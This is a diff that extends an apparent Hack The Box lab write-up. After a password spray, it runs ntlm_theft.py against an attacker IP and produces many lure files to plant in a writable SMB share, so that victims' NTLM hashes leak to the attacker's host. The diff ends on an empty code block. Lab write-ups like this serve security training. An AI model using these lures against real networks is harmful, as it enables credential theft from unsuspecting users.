@@ -247,4 +247,40 @@ My next thought is if this password gets me access to two accounts it may give m
 After performing a password spray on all the users it was only these two that are compromised
 
 # Watering hole attack
-Since i have write access on `que`
+Since i have write access on `queue` i think im going to start there
+
+```python
+python3 ntlm_theft.py -g modern -s 10.10.14.90 -f meeting
+/home/kali/htb/bruno/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
+  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
+Skipping SCF as it does not work on modern Windows
+Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
+Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
+Created: meeting/meeting.lnk (BROWSE TO FOLDER)
+Created: meeting/meeting.rtf (OPEN)
+Created: meeting/meeting-(stylesheet).xml (OPEN)
+Created: meeting/meeting-(fulldocx).xml (OPEN)
+Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(includepicture).docx (OPEN)
+Created: meeting/meeting-(remotetemplate).docx (OPEN)
+Created: meeting/meeting-(frameset).docx (OPEN)
+Created: meeting/meeting-(externalcell).xlsx (OPEN)
+Created: meeting/meeting.wax (OPEN)
+Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: meeting/meeting.asx (OPEN)
+Created: meeting/meeting.jnlp (OPEN)
+Created: meeting/meeting.application (DOWNLOAD AND OPEN)
+Created: meeting/meeting.pdf (OPEN AND ALLOW)
+Skipping zoom as it does not work on the latest versions
+Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
+Skipping Autorun.inf as it does not work on modern Windows
+Skipping desktop.ini as it does not work on modern Windows
+Created: meeting/meeting.theme (THEME TO INSTALL
+Generation Complete.
+```
+This generated files that ill plant in the SMB share
+
+```python
+
+```
